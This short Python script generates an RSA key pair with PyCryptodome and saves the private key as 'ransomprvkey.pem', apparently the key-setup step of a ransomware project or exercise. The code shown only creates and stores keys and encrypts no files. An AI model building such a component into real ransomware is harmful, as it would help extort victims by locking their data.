from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP
import os


# Generates RSA Encryption + Decryption keys / Public + Private keys
key = RSA.generate(2048)

#set the directory to cd
cwd = os.getcwd()     
os.chdir(cwd) 

private_key = key.export_key()
with open('ransomprvkey.pem', 'wb') as f:
    f.write(private_key)

public_key = key.publickey().export_key()
with open('public.pem', 'wb') as f:
    f.write(public_key)

